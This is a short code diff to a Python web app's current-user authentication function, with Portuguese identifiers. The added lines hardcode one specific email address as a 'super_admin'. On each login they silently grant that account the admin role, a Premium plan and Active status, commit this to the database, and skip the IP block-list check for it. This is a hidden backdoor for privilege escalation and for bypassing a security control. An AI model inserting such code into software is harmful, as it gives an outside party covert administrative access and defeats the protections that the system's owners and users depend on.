@@ -56,7 +56,13 @@ def get_usuario_atual(
     if usuario is None:
         raise credentials_exception
     ip = request.client.host if request.client else None
-    if ip:
+    super_admin = usuario.email and usuario.email.lower() == "pinnacleb109@gmail.com"
+    if super_admin:
+        usuario.role = "admin"
+        usuario.plano = "Premium"
+        usuario.status = "Ativo"
+        db.commit()
+    if ip and not super_admin:
         bloqueado = db.query(models.BlockedIP).filter(models.BlockedIP.ip == ip, models.BlockedIP.ativo == True).first()
         if bloqueado:
             raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="IP bloqueado")
